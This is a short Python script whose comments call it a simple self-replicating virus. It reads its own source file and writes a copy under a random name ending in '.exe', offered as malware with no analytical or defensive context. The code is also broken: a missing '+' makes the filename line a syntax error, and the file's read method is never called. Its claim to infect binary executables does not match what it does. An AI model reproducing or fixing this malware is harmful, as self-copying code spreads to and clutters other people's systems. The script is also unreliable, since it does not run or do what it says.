#Simple Virus One in Python
#This is a piece of malware which self replicates in Binary Executables

from sys import argv
from random import choice, randint
from string import ascii_letters as Alphabets

Randstr = lambda length: "".join([choice(Alphabets) for x in range(length)]) ".exe"

File_Name = Randstr(randint(4,8))
Self_Script = argv [0]

with open(Self_Script, "rb") as File:
    Data = File.read

with open(File_Name, "wb") as File:
    File.write(Data)